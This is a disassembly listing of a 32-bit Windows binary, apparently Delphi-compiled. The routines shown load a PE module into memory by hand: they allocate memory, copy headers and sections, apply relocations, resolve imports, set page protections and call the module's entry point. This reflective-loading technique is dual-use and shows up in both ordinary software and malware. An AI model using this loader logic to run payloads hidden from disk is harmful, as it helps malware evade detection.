  403b1e:	33 32                	xor    (%edx),%esi
  403b20:	00 00                	add    %al,(%eax)
  403b22:	00 00                	add    %al,(%eax)
  403b24:	47                   	inc    %edi
  403b25:	65 74 50             	gs je  0x403b78
  403b28:	72 6f                	jb     0x403b99
  403b2a:	63 41 64             	arpl   %eax,0x64(%ecx)
  403b2d:	64 72 65             	fs jb  0x403b95
  403b30:	73 73                	jae    0x403ba5
  403b32:	00 00                	add    %al,(%eax)
  403b34:	45                   	inc    %ebp
  403b35:	78 69                	js     0x403ba0
  403b37:	74 54                	je     0x403b8d
  403b39:	68 72 65 61 64       	push   $0x64616572
  403b3e:	00 00                	add    %al,(%eax)
  403b40:	55                   	push   %ebp
  403b41:	8b ec                	mov    %esp,%ebp
  403b43:	83 c4 f8             	add    $0xfffffff8,%esp
  403b46:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403b49:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403b4c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403b4f:	e8 d8 f4 ff ff       	call   0x40302c
  403b54:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403b57:	e8 dc e3 ff ff       	call   0x401f38
  403b5c:	33 c0                	xor    %eax,%eax
  403b5e:	55                   	push   %ebp
  403b5f:	68 c5 3b 40 00       	push   $0x403bc5
  403b64:	64 ff 30             	push   %fs:(%eax)
  403b67:	64 89 20             	mov    %esp,%fs:(%eax)
  403b6a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403b6d:	e8 8e f2 ff ff       	call   0x402e00
  403b72:	40                   	inc    %eax
  403b73:	50                   	push   %eax
  403b74:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403b77:	b9 01 00 00 00       	mov    $0x1,%ecx
  403b7c:	8b 15 88 37 40 00    	mov    0x403788,%edx
  403b82:	e8 35 f4 ff ff       	call   0x402fbc
  403b87:	83 c4 04             	add    $0x4,%esp
  403b8a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403b8d:	e8 6e f2 ff ff       	call   0x402e00
  403b92:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403b95:	8d 44 82 fc          	lea    -0x4(%edx,%eax,4),%eax
  403b99:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403b9c:	e8 73 df ff ff       	call   0x401b14
  403ba1:	33 c0                	xor    %eax,%eax
  403ba3:	5a                   	pop    %edx
  403ba4:	59                   	pop    %ecx
  403ba5:	59                   	pop    %ecx
  403ba6:	64 89 10             	mov    %edx,%fs:(%eax)
  403ba9:	68 cc 3b 40 00       	push   $0x403bcc
  403bae:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403bb1:	e8 0a df ff ff       	call   0x401ac0
  403bb6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403bb9:	8b 15 88 37 40 00    	mov    0x403788,%edx
  403bbf:	e8 04 f4 ff ff       	call   0x402fc8
  403bc4:	c3                   	ret
  403bc5:	e9 42 dc ff ff       	jmp    0x40180c
  403bca:	eb e2                	jmp    0x403bae
  403bcc:	59                   	pop    %ecx
  403bcd:	59                   	pop    %ecx
  403bce:	5d                   	pop    %ebp
  403bcf:	c3                   	ret
  403bd0:	55                   	push   %ebp
  403bd1:	8b ec                	mov    %esp,%ebp
  403bd3:	83 c4 f0             	add    $0xfffffff0,%esp
  403bd6:	53                   	push   %ebx
  403bd7:	56                   	push   %esi
  403bd8:	57                   	push   %edi
  403bd9:	8b da                	mov    %edx,%ebx
  403bdb:	85 db                	test   %ebx,%ebx
  403bdd:	78 07                	js     0x403be6
  403bdf:	8b 34 98             	mov    (%eax,%ebx,4),%esi
  403be2:	4b                   	dec    %ebx
  403be3:	56                   	push   %esi
  403be4:	79 f9                	jns    0x403bdf
  403be6:	8b c4                	mov    %esp,%eax
  403be8:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  403beb:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403bee:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403bf1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403bf4:	41                   	inc    %ecx
  403bf5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403bf8:	8b 15 14 10 40 00    	mov    0x401014,%edx
  403bfe:	e8 41 ea ff ff       	call   0x402644
  403c03:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403c06:	e8 2d e3 ff ff       	call   0x401f38
  403c0b:	33 c0                	xor    %eax,%eax
  403c0d:	55                   	push   %ebp
  403c0e:	68 7e 3c 40 00       	push   $0x403c7e
  403c13:	64 ff 30             	push   %fs:(%eax)
  403c16:	64 89 20             	mov    %esp,%fs:(%eax)
  403c19:	c6 45 f3 00          	movb   $0x0,-0xd(%ebp)
  403c1d:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403c20:	46                   	inc    %esi
  403c21:	4e                   	dec    %esi
  403c22:	85 f6                	test   %esi,%esi
  403c24:	7c 30                	jl     0x403c56
  403c26:	46                   	inc    %esi
  403c27:	33 ff                	xor    %edi,%edi
  403c29:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  403c2c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403c2f:	e8 14 e3 ff ff       	call   0x401f48
  403c34:	50                   	push   %eax
  403c35:	8b 03                	mov    (%ebx),%eax
  403c37:	e8 0c e3 ff ff       	call   0x401f48
  403c3c:	50                   	push   %eax
  403c3d:	e8 86 fa ff ff       	call   0x4036c8
  403c42:	85 c0                	test   %eax,%eax
  403c44:	75 09                	jne    0x403c4f
  403c46:	8b 45 08             	mov    0x8(%ebp),%eax
  403c49:	89 38                	mov    %edi,(%eax)
  403c4b:	c6 45 f3 01          	movb   $0x1,-0xd(%ebp)
  403c4f:	47                   	inc    %edi
  403c50:	83 c3 04             	add    $0x4,%ebx
  403c53:	4e                   	dec    %esi
  403c54:	75 d6                	jne    0x403c2c
  403c56:	33 c0                	xor    %eax,%eax
  403c58:	5a                   	pop    %edx
  403c59:	59                   	pop    %ecx
  403c5a:	59                   	pop    %ecx
  403c5b:	64 89 10             	mov    %edx,%fs:(%eax)
  403c5e:	68 85 3c 40 00       	push   $0x403c85
  403c63:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403c66:	e8 55 de ff ff       	call   0x401ac0
  403c6b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c6e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403c71:	41                   	inc    %ecx
  403c72:	8b 15 14 10 40 00    	mov    0x401014,%edx
  403c78:	e8 a7 e8 ff ff       	call   0x402524
  403c7d:	c3                   	ret
  403c7e:	e9 89 db ff ff       	jmp    0x40180c
  403c83:	eb de                	jmp    0x403c63
  403c85:	8a 45 f3             	mov    -0xd(%ebp),%al
  403c88:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  403c8b:	8b 75 e8             	mov    -0x18(%ebp),%esi
  403c8e:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  403c91:	8b e5                	mov    %ebp,%esp
  403c93:	5d                   	pop    %ebp
  403c94:	c2 04 00             	ret    $0x4
  403c97:	90                   	nop
  403c98:	33 d2                	xor    %edx,%edx
  403c9a:	a9 00 00 00 04       	test   $0x4000000,%eax
  403c9f:	74 06                	je     0x403ca7
  403ca1:	81 ca 00 02 00 00    	or     $0x200,%edx
  403ca7:	a9 00 00 00 20       	test   $0x20000000,%eax
  403cac:	74 2d                	je     0x403cdb
  403cae:	a9 00 00 00 40       	test   $0x40000000,%eax
  403cb3:	74 11                	je     0x403cc6
  403cb5:	a9 00 00 00 80       	test   $0x80000000,%eax
  403cba:	74 05                	je     0x403cc1
  403cbc:	83 ca 40             	or     $0x40,%edx
  403cbf:	eb 41                	jmp    0x403d02
  403cc1:	83 ca 20             	or     $0x20,%edx
  403cc4:	eb 3c                	jmp    0x403d02
  403cc6:	a9 00 00 00 80       	test   $0x80000000,%eax
  403ccb:	74 08                	je     0x403cd5
  403ccd:	81 ca 80 00 00 00    	or     $0x80,%edx
  403cd3:	eb 2d                	jmp    0x403d02
  403cd5:	83 ca 10             	or     $0x10,%edx
  403cd8:	8b c2                	mov    %edx,%eax
  403cda:	c3                   	ret
  403cdb:	a9 00 00 00 40       	test   $0x40000000,%eax
  403ce0:	74 11                	je     0x403cf3
  403ce2:	a9 00 00 00 80       	test   $0x80000000,%eax
  403ce7:	74 05                	je     0x403cee
  403ce9:	83 ca 04             	or     $0x4,%edx
  403cec:	eb 14                	jmp    0x403d02
  403cee:	83 ca 02             	or     $0x2,%edx
  403cf1:	eb 0f                	jmp    0x403d02
  403cf3:	a9 00 00 00 80       	test   $0x80000000,%eax
  403cf8:	74 05                	je     0x403cff
  403cfa:	83 ca 08             	or     $0x8,%edx
  403cfd:	eb 03                	jmp    0x403d02
  403cff:	83 ca 01             	or     $0x1,%edx
  403d02:	8b c2                	mov    %edx,%eax
  403d04:	c3                   	ret
  403d05:	8d 40 00             	lea    0x0(%eax),%eax
  403d08:	55                   	push   %ebp
  403d09:	8b ec                	mov    %esp,%ebp
  403d0b:	83 c4 f8             	add    $0xfffffff8,%esp
  403d0e:	53                   	push   %ebx
  403d0f:	56                   	push   %esi
  403d10:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403d13:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d16:	8b 55 08             	mov    0x8(%ebp),%edx
  403d19:	8b 52 fc             	mov    -0x4(%edx),%edx
  403d1c:	8b 92 a4 00 00 00    	mov    0xa4(%edx),%edx
  403d22:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403d25:	eb 3c                	jmp    0x403d63
  403d27:	8b 48 04             	mov    0x4(%eax),%ecx
  403d2a:	83 e9 08             	sub    $0x8,%ecx
  403d2d:	d1 e9                	shr    $1,%ecx
  403d2f:	83 c2 08             	add    $0x8,%edx
  403d32:	49                   	dec    %ecx
  403d33:	85 c9                	test   %ecx,%ecx
  403d35:	72 2a                	jb     0x403d61
  403d37:	41                   	inc    %ecx
  403d38:	f6 42 01 f0          	testb  $0xf0,0x1(%edx)
  403d3c:	74 1d                	je     0x403d5b
  403d3e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403d41:	8b 5b f4             	mov    -0xc(%ebx),%ebx
  403d44:	03 18                	add    (%eax),%ebx
  403d46:	66 8b 32             	mov    (%edx),%si
  403d49:	66 81 e6 ff 0f       	and    $0xfff,%si
  403d4e:	0f b7 f6             	movzwl %si,%esi
  403d51:	03 de                	add    %esi,%ebx
  403d53:	8b 75 08             	mov    0x8(%ebp),%esi
  403d56:	8b 76 f8             	mov    -0x8(%esi),%esi
  403d59:	01 33                	add    %esi,(%ebx)
  403d5b:	83 c2 02             	add    $0x2,%edx
  403d5e:	49                   	dec    %ecx
  403d5f:	75 d7                	jne    0x403d38
  403d61:	8b c2                	mov    %edx,%eax
  403d63:	8b d0                	mov    %eax,%edx
  403d65:	8b ca                	mov    %edx,%ecx
  403d67:	2b 4d fc             	sub    -0x4(%ebp),%ecx
  403d6a:	3b 4d f8             	cmp    -0x8(%ebp),%ecx
  403d6d:	72 b8                	jb     0x403d27
  403d6f:	5e                   	pop    %esi
  403d70:	5b                   	pop    %ebx
  403d71:	59                   	pop    %ecx
  403d72:	59                   	pop    %ecx
  403d73:	5d                   	pop    %ebp
  403d74:	c3                   	ret
  403d75:	8d 40 00             	lea    0x0(%eax),%eax
  403d78:	a9 00 00 00 80       	test   $0x80000000,%eax
  403d7d:	0f 95 c0             	setne  %al
  403d80:	c3                   	ret
  403d81:	8d 40 00             	lea    0x0(%eax),%eax
  403d84:	55                   	push   %ebp
  403d85:	8b ec                	mov    %esp,%ebp
  403d87:	83 c4 e8             	add    $0xffffffe8,%esp
  403d8a:	53                   	push   %ebx
  403d8b:	56                   	push   %esi
  403d8c:	33 d2                	xor    %edx,%edx
  403d8e:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403d91:	89 55 ec             	mov    %edx,-0x14(%ebp)
  403d94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  403d97:	33 d2                	xor    %edx,%edx
  403d99:	55                   	push   %ebp
  403d9a:	68 b2 3e 40 00       	push   $0x403eb2
  403d9f:	64 ff 32             	push   %fs:(%edx)
  403da2:	64 89 22             	mov    %esp,%fs:(%edx)
  403da5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403da8:	e9 dc 00 00 00       	jmp    0x403e89
  403dad:	8b 55 08             	mov    0x8(%ebp),%edx
  403db0:	03 42 f4             	add    -0xc(%edx),%eax
  403db3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403db6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403db9:	50                   	push   %eax
  403dba:	8b 45 08             	mov    0x8(%ebp),%eax
  403dbd:	8b 58 f0             	mov    -0x10(%eax),%ebx
  403dc0:	8b c3                	mov    %ebx,%eax
  403dc2:	e8 41 f0 ff ff       	call   0x402e08
  403dc7:	50                   	push   %eax
  403dc8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403dcb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403dce:	e8 d9 de ff ff       	call   0x401cac
  403dd3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403dd6:	8b 45 08             	mov    0x8(%ebp),%eax
  403dd9:	8b c3                	mov    %ebx,%eax
  403ddb:	5a                   	pop    %edx
  403ddc:	e8 ef fd ff ff       	call   0x403bd0
  403de1:	84 c0                	test   %al,%al
  403de3:	75 32                	jne    0x403e17
  403de5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403de8:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403deb:	e8 bc de ff ff       	call   0x401cac
  403df0:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403df3:	8b 45 08             	mov    0x8(%ebp),%eax
  403df6:	8b 40 dc             	mov    -0x24(%eax),%eax
  403df9:	e8 56 fb ff ff       	call   0x403954
  403dfe:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403e01:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403e04:	e8 a3 de ff ff       	call   0x401cac
  403e09:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403e0c:	8b 45 08             	mov    0x8(%ebp),%eax
  403e0f:	8b 40 f0             	mov    -0x10(%eax),%eax
  403e12:	e8 29 fd ff ff       	call   0x403b40
  403e17:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e1a:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  403e1e:	75 0e                	jne    0x403e2e
  403e20:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e23:	8b 58 10             	mov    0x10(%eax),%ebx
  403e26:	8b 45 08             	mov    0x8(%ebp),%eax
  403e29:	03 58 f4             	add    -0xc(%eax),%ebx
  403e2c:	eb 51                	jmp    0x403e7f
  403e2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e31:	8b 18                	mov    (%eax),%ebx
  403e33:	8b 45 08             	mov    0x8(%ebp),%eax
  403e36:	03 58 f4             	add    -0xc(%eax),%ebx
  403e39:	eb 44                	jmp    0x403e7f
  403e3b:	8b c6                	mov    %esi,%eax
  403e3d:	e8 36 ff ff ff       	call   0x403d78
  403e42:	84 c0                	test   %al,%al
  403e44:	74 18                	je     0x403e5e
  403e46:	8b 0b                	mov    (%ebx),%ecx
  403e48:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  403e4e:	8b 45 08             	mov    0x8(%ebp),%eax
  403e51:	8b 40 dc             	mov    -0x24(%eax),%eax
  403e54:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403e57:	e8 fc fb ff ff       	call   0x403a58
  403e5c:	eb 1c                	jmp    0x403e7a
  403e5e:	8b 45 08             	mov    0x8(%ebp),%eax
  403e61:	8b 40 f4             	mov    -0xc(%eax),%eax
  403e64:	03 03                	add    (%ebx),%eax
  403e66:	83 c0 02             	add    $0x2,%eax
  403e69:	8b 55 08             	mov    0x8(%ebp),%edx
  403e6c:	8b 52 dc             	mov    -0x24(%edx),%edx
  403e6f:	8b c8                	mov    %eax,%ecx
  403e71:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403e74:	92                   	xchg   %eax,%edx
  403e75:	e8 de fb ff ff       	call   0x403a58
  403e7a:	89 03                	mov    %eax,(%ebx)
  403e7c:	83 c3 04             	add    $0x4,%ebx
  403e7f:	8b 33                	mov    (%ebx),%esi
  403e81:	85 f6                	test   %esi,%esi
  403e83:	75 b6                	jne    0x403e3b
  403e85:	83 45 fc 14          	addl   $0x14,-0x4(%ebp)
  403e89:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e8c:	8b 40 0c             	mov    0xc(%eax),%eax
  403e8f:	85 c0                	test   %eax,%eax
  403e91:	0f 85 16 ff ff ff    	jne    0x403dad
  403e97:	33 c0                	xor    %eax,%eax
  403e99:	5a                   	pop    %edx
  403e9a:	59                   	pop    %ecx
  403e9b:	59                   	pop    %ecx
  403e9c:	64 89 10             	mov    %edx,%fs:(%eax)
  403e9f:	68 b9 3e 40 00       	push   $0x403eb9
  403ea4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403ea7:	ba 03 00 00 00       	mov    $0x3,%edx
  403eac:	e8 33 dc ff ff       	call   0x401ae4
  403eb1:	c3                   	ret
  403eb2:	e9 55 d9 ff ff       	jmp    0x40180c
  403eb7:	eb eb                	jmp    0x403ea4
  403eb9:	5e                   	pop    %esi
  403eba:	5b                   	pop    %ebx
  403ebb:	8b e5                	mov    %ebp,%esp
  403ebd:	5d                   	pop    %ebp
  403ebe:	c3                   	ret
  403ebf:	90                   	nop
  403ec0:	55                   	push   %ebp
  403ec1:	8b ec                	mov    %esp,%ebp
  403ec3:	83 c4 c8             	add    $0xffffffc8,%esp
  403ec6:	53                   	push   %ebx
  403ec7:	56                   	push   %esi
  403ec8:	57                   	push   %edi
  403ec9:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  403ecc:	8b da                	mov    %edx,%ebx
  403ece:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403ed1:	8d 45 e0             	lea    -0x20(%ebp),%eax
  403ed4:	8b 15 bc 37 40 00    	mov    0x4037bc,%edx
  403eda:	e8 4d e5 ff ff       	call   0x40242c
  403edf:	33 c0                	xor    %eax,%eax
  403ee1:	55                   	push   %ebp
  403ee2:	68 ba 40 40 00       	push   $0x4040ba
  403ee7:	64 ff 30             	push   %fs:(%eax)
  403eea:	64 89 20             	mov    %esp,%fs:(%eax)
  403eed:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403ef0:	33 d2                	xor    %edx,%edx
  403ef2:	52                   	push   %edx
  403ef3:	50                   	push   %eax
  403ef4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403ef7:	8b 40 3c             	mov    0x3c(%eax),%eax
  403efa:	99                   	cltd
  403efb:	03 04 24             	add    (%esp),%eax
  403efe:	13 54 24 04          	adc    0x4(%esp),%edx
  403f02:	83 c4 08             	add    $0x8,%esp
  403f05:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f08:	6a 01                	push   $0x1
  403f0a:	68 00 20 00 00       	push   $0x2000
  403f0f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f12:	8b 40 50             	mov    0x50(%eax),%eax
  403f15:	50                   	push   %eax
  403f16:	53                   	push   %ebx
  403f17:	e8 64 f7 ff ff       	call   0x403680
  403f1c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403f1f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f22:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403f25:	2b 50 34             	sub    0x34(%eax),%edx
  403f28:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403f2b:	6a 04                	push   $0x4
  403f2d:	68 00 10 00 00       	push   $0x1000
  403f32:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f35:	8b 40 54             	mov    0x54(%eax),%eax
  403f38:	50                   	push   %eax
  403f39:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403f3c:	50                   	push   %eax
  403f3d:	e8 3e f7 ff ff       	call   0x403680
  403f42:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403f45:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f48:	8b 48 54             	mov    0x54(%eax),%ecx
  403f4b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403f4e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403f51:	e8 02 d3 ff ff       	call   0x401258
  403f56:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403f59:	50                   	push   %eax
  403f5a:	6a 02                	push   $0x2
  403f5c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f5f:	8b 40 54             	mov    0x54(%eax),%eax
  403f62:	50                   	push   %eax
  403f63:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403f66:	50                   	push   %eax
  403f67:	e8 34 f7 ff ff       	call   0x4036a0
  403f6c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f6f:	8d 70 18             	lea    0x18(%eax),%esi
  403f72:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f75:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  403f79:	03 f0                	add    %eax,%esi
  403f7b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f7e:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  403f82:	48                   	dec    %eax
  403f83:	85 c0                	test   %eax,%eax
  403f85:	7c 67                	jl     0x403fee
  403f87:	40                   	inc    %eax
  403f88:	89 45 c8             	mov    %eax,-0x38(%ebp)
  403f8b:	33 db                	xor    %ebx,%ebx
  403f8d:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  403f90:	8b 7c c6 08          	mov    0x8(%esi,%eax,8),%edi
  403f94:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  403f97:	8b 44 c6 10          	mov    0x10(%esi,%eax,8),%eax
  403f9b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403f9e:	3b 7d d0             	cmp    -0x30(%ebp),%edi
  403fa1:	73 09                	jae    0x403fac
  403fa3:	33 7d d0             	xor    -0x30(%ebp),%edi
  403fa6:	31 7d d0             	xor    %edi,-0x30(%ebp)
  403fa9:	33 7d d0             	xor    -0x30(%ebp),%edi
  403fac:	6a 04                	push   $0x4
  403fae:	68 00 10 00 00       	push   $0x1000
  403fb3:	57                   	push   %edi
  403fb4:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  403fb7:	8b 44 c6 0c          	mov    0xc(%esi,%eax,8),%eax
  403fbb:	03 45 f4             	add    -0xc(%ebp),%eax
  403fbe:	50                   	push   %eax
  403fbf:	e8 bc f6 ff ff       	call   0x403680
  403fc4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403fc7:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403fca:	33 c9                	xor    %ecx,%ecx
  403fcc:	8b d7                	mov    %edi,%edx
  403fce:	e8 41 d4 ff ff       	call   0x401414
  403fd3:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403fd6:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  403fd9:	8b 44 c6 14          	mov    0x14(%esi,%eax,8),%eax
  403fdd:	03 45 d8             	add    -0x28(%ebp),%eax
  403fe0:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  403fe3:	e8 70 d2 ff ff       	call   0x401258
  403fe8:	43                   	inc    %ebx
  403fe9:	ff 4d c8             	decl   -0x38(%ebp)
  403fec:	75 9f                	jne    0x403f8d
  403fee:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403ff1:	8b 40 28             	mov    0x28(%eax),%eax
  403ff4:	03 45 f4             	add    -0xc(%ebp),%eax
  403ff7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403ffa:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403ffd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404000:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404003:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404006:	8b 40 50             	mov    0x50(%eax),%eax
  404009:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40400c:	6a 00                	push   $0x0
  40400e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404011:	b9 01 00 00 00       	mov    $0x1,%ecx
  404016:	8b 15 88 37 40 00    	mov    0x403788,%edx
  40401c:	e8 9b ef ff ff       	call   0x402fbc
  404021:	83 c4 04             	add    $0x4,%esp
  404024:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404027:	8b 80 a0 00 00 00    	mov    0xa0(%eax),%eax
  40402d:	85 c0                	test   %eax,%eax
  40402f:	74 0a                	je     0x40403b
  404031:	55                   	push   %ebp
  404032:	03 45 f4             	add    -0xc(%ebp),%eax
  404035:	e8 ce fc ff ff       	call   0x403d08
  40403a:	59                   	pop    %ecx
  40403b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40403e:	8b 80 80 00 00 00    	mov    0x80(%eax),%eax
  404044:	85 c0                	test   %eax,%eax
  404046:	74 0a                	je     0x404052
  404048:	55                   	push   %ebp
  404049:	03 45 f4             	add    -0xc(%ebp),%eax
  40404c:	e8 33 fd ff ff       	call   0x403d84
  404051:	59                   	pop    %ecx
  404052:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404055:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  404059:	48                   	dec    %eax
  40405a:	85 c0                	test   %eax,%eax
  40405c:	7c 2f                	jl     0x40408d
  40405e:	40                   	inc    %eax
  40405f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404062:	33 db                	xor    %ebx,%ebx
  404064:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404067:	50                   	push   %eax
  404068:	8d 3c 9b             	lea    (%ebx,%ebx,4),%edi
  40406b:	8b 44 fe 24          	mov    0x24(%esi,%edi,8),%eax
  40406f:	e8 24 fc ff ff       	call   0x403c98
  404074:	50                   	push   %eax
  404075:	8b 44 fe 08          	mov    0x8(%esi,%edi,8),%eax
  404079:	50                   	push   %eax
  40407a:	8b 44 fe 0c          	mov    0xc(%esi,%edi,8),%eax
  40407e:	03 45 f4             	add    -0xc(%ebp),%eax
  404081:	50                   	push   %eax
  404082:	e8 19 f6 ff ff       	call   0x4036a0
  404087:	43                   	inc    %ebx
  404088:	ff 4d c8             	decl   -0x38(%ebp)
  40408b:	75 d7                	jne    0x404064
  40408d:	8b 45 08             	mov    0x8(%ebp),%eax
  404090:	8d 55 e0             	lea    -0x20(%ebp),%edx
  404093:	8b 0d bc 37 40 00    	mov    0x4037bc,%ecx
  404099:	e8 66 e6 ff ff       	call   0x402704
  40409e:	33 c0                	xor    %eax,%eax
  4040a0:	5a                   	pop    %edx
  4040a1:	59                   	pop    %ecx
  4040a2:	59                   	pop    %ecx
  4040a3:	64 89 10             	mov    %edx,%fs:(%eax)
  4040a6:	68 c1 40 40 00       	push   $0x4040c1
  4040ab:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4040ae:	8b 15 bc 37 40 00    	mov    0x4037bc,%edx
  4040b4:	e8 37 e4 ff ff       	call   0x4024f0
  4040b9:	c3                   	ret
  4040ba:	e9 4d d7 ff ff       	jmp    0x40180c
  4040bf:	eb ea                	jmp    0x4040ab
  4040c1:	5f                   	pop    %edi
  4040c2:	5e                   	pop    %esi
  4040c3:	5b                   	pop    %ebx
  4040c4:	8b e5                	mov    %ebp,%esp
  4040c6:	5d                   	pop    %ebp
  4040c7:	c2 04 00             	ret    $0x4
  4040ca:	8b c0                	mov    %eax,%eax
  4040cc:	55                   	push   %ebp
  4040cd:	8b ec                	mov    %esp,%ebp
  4040cf:	83 c4 f8             	add    $0xfffffff8,%esp
  4040d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4040d5:	8b 10                	mov    (%eax),%edx
  4040d7:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4040da:	8b 50 04             	mov    0x4(%eax),%edx
  4040dd:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4040e0:	31 c0                	xor    %eax,%eax
  4040e2:	50                   	push   %eax
  4040e3:	6a 01                	push   $0x1
  4040e5:	ff 75 f8             	push   -0x8(%ebp)
  4040e8:	ff 55 fc             	call   *-0x4(%ebp)
  4040eb:	59                   	pop    %ecx
  4040ec:	59                   	pop    %ecx
  4040ed:	5d                   	pop    %ebp
  4040ee:	c2 04 00             	ret    $0x4
  4040f1:	8d 40 00             	lea    0x0(%eax),%eax
  4040f4:	55                   	push   %ebp
  4040f5:	8b ec                	mov    %esp,%ebp
  4040f7:	83 c4 d4             	add    $0xffffffd4,%esp
  4040fa:	53                   	push   %ebx
  4040fb:	56                   	push   %esi
  4040fc:	57                   	push   %edi
  4040fd:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404100:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404103:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404106:	8b 15 bc 37 40 00    	mov    0x4037bc,%edx
  40410c:	e8 1b e3 ff ff       	call   0x40242c
  404111:	33 c0                	xor    %eax,%eax
  404113:	55                   	push   %ebp
  404114:	68 05 42 40 00       	push   $0x404205
  404119:	64 ff 30             	push   %fs:(%eax)
  40411c:	64 89 20             	mov    %esp,%fs:(%eax)
  40411f:	c6 45 f7 00          	movb   $0x0,-0x9(%ebp)
  404123:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404126:	33 d2                	xor    %edx,%edx
  404128:	52                   	push   %edx
  404129:	50                   	push   %eax
  40412a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40412d:	8b 40 3c             	mov    0x3c(%eax),%eax
  404130:	99                   	cltd
  404131:	03 04 24             	add    (%esp),%eax
  404134:	13 54 24 04          	adc    0x4(%esp),%edx
  404138:	83 c4 08             	add    $0x8,%esp
  40413b:	8b f8                	mov    %eax,%edi
